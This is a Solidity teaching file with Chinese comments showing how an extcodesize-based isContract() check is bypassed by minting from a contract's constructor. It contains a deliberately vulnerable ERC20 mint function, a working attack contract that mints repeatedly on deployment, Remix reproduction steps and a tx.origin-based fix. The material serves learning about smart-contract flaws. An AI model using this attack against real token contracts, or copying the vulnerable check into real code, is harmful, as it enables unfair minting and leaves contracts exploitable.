/*
	绕过合约检查
	很多 freemint 的项目为了限制科学家(程序员)会用到 isContract() 方法, 希望
	将调用者 msg.sender 限制为外部账户(EOA)而非合约; 这个函数利用 extcodesize 
	获取该地址所存储的 bytecode 长度(runtime), 若大于0, 则判断为合约, 否则
	就是EOA(用户); (TODO: 合约账户调用会如何? extcodesize ?)
	    // 利用 extcodesize 检查是否为合约
		function isContract(address account) public view returns (bool) {
			// extcodesize > 0 的地址一定是合约地址
			// 但是合约在构造函数时候 extcodesize 为0
			uint size;
			assembly {
				size := extcodesize(account)
			}
			return size > 0;
		}


	这里有一个漏洞, 就是在合约在被创建的时候, runtime bytecode 还没有被存储
	到地址上, 因此 bytecode 长度为0; 也就是说, 如果将逻辑写在合约的构造函数
	constructor 中的话, 就可以绕过 isContract() 检查


	以太坊中有两类账户, 一类是普通的由私钥控制的外部账户, 一类是关联有合约
	代码的合约账户; EVM 提供了一个操作码 EXTCODESIZE, 用来获取地址相关联的
	代码大小(长度), 如果是外部账号地址, 则没有代码返回;


	Remix 复现
	1. 部署 ContractCheck 合约
	2. 部署 NotContract 合约, 参数为 ContractCheck 合约地址
	3. 调用 ContractCheck 合约的 balanceOf 查看 NotContract 合约的代币余额为
		1000, 攻击成功
	4. 调用NotContract 合约的 mint() 函数, 由于此时合约已经部署完成, 
		调用 mint() 函数将失败

		预防: (TODO: 熟悉全局变量, 如tx)
	可以使用 (tx.origin == msg.sender) 检测调用者是否为合约, 如果调用者为 EOA, 
	那么tx.origin和msg.sender相等; 如果不相等, 则调用者为合约;
		function realContract(address account) public view returns (bool) {
			return (tx.origin == msg.sender);
		}

*/

// 用extcodesize检查是否为合约地址
contract ContractCheck is ERC20 {
    // 构造函数: 初始化代币名称和代号
    constructor() ERC20("", "") {}

    // 利用 extcodesize 检查是否为合约
    function isContract(address account) public view returns (bool) {
        // extcodesize > 0 的地址一定是合约地址
        // 但是合约在构造函数时候 extcodesize 为0
        uint size;
        assembly { // TODO: assembly ?
            size := extcodesize(account)
        }
        return size > 0;
    }

    // mint函数, 只有非合约地址能调用(有漏洞)
    function mint() public {
        require(!isContract(msg.sender), "Contract not allowed!");
        _mint(msg.sender, 100);
    }
}


// 攻击合约, 利用构造函数的特点攻击
contract NotContract {
    bool public isContract;
    address public contractCheck;

    // 当合约正在被创建时, extcodesize(代码长度)为 0, 因此不会被 isContract() 
	// 检测出;
    constructor(address addr) {
        contractCheck = addr;
        isContract = ContractCheck(addr).isContract(address(this));
        // This will work
        for(uint i; i < 10; i++){
            ContractCheck(addr).mint();
        }
    }

    // 合约创建好以后，extcodesize > 0, isContract() 可以检测
    function mint() external {
        ContractCheck(contractCheck).mint();
    }


	/*
		在构造函数调用 mint() 可以绕过 isContract() 的检查成功铸造代币, 那么
		函数将成功部署, 并且状态变量 isContract 会在构造函数赋值 false; 
		而在合约部署之后, runtime bytecode 已经被存储在合约地址上了,  
		extcodesize > 0,  isContract() 能够成功阻止铸造, 调用 mint() 函数将失败


	*/
}

